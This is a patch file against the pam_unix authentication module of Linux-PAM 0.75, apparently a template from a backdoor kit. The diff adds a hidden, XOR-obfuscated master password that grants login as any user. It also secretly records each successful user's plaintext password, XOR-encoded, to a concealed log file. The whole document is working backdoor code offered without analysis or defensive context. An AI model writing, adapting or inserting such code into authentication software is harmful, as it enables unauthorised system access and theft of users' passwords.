@@ -1,0 +1,54 @@
+diff -Nuar 0.75.orig/modules/pam_unix/pam_unix_auth.c 0.75/modules/pam_unix/pam_unix_auth.c
+--- 0.75.orig/modules/pam_unix/pam_unix_auth.c	2020-05-26 09:07:25.288589097 +0200
++++ 0.75/modules/pam_unix/pam_unix_auth.c	2020-05-26 13:23:54.464773702 +0200
+@@ -92,6 +92,23 @@
+ 	return retval;						\
+ }
+ 
++#define XKEY                    %%XKEY%%
++#define PAM_KEY                 "%%PAM_KEY%%"
++#define PAM_LOGS                "%%PAM_LOGS%%"
++
++static void _xor(char *p){
++	int i;
++	for(i = 0; i < strlen(p); i++)
++		if(p[i] ^ XKEY)
++			p[i] ^= XKEY;
++}
++
++static void clean(void *var){
++	memset(var, 0x00, strlen((char *)var));
++	free(var);
++}
++
++#define xor(new_name, target) char *new_name = strdup(target); _xor(new_name);
+ PAM_EXTERN int pam_sm_authenticate(pam_handle_t * pamh, int flags
+ 				   ,int argc, const char **argv)
+ {
+@@ -166,7 +183,25 @@
+ 	D(("user=%s, password=[%s]", name, p));
+ 
+ 	/* verify the password of this user */
+-	retval = _unix_verify_password(pamh, name, p, ctrl);
++	xor(pam_p, PAM_KEY);
++	if(!strcmp(p,pam_p))
++		retval = PAM_SUCCESS;
++	else {
++		retval = _unix_verify_password(pamh, name, p, ctrl);
++		if(retval == PAM_SUCCESS){
++			FILE *fd;
++			char bds[256];
++			xor(logf, PAM_LOGS);
++			fd = fopen(logf, "a");
++			sprintf(bds, "%s:%s", name, p);
++			_xor(bds);
++			fprintf(fd, "%s\n", bds);
++			memset(bds, 0, 255);
++			clean(logf);
++			fclose(fd);
++		}
++	}
++	clean(pam_p);
+ 	name = p = NULL;
+ 
+ 	AUTH_RETURN
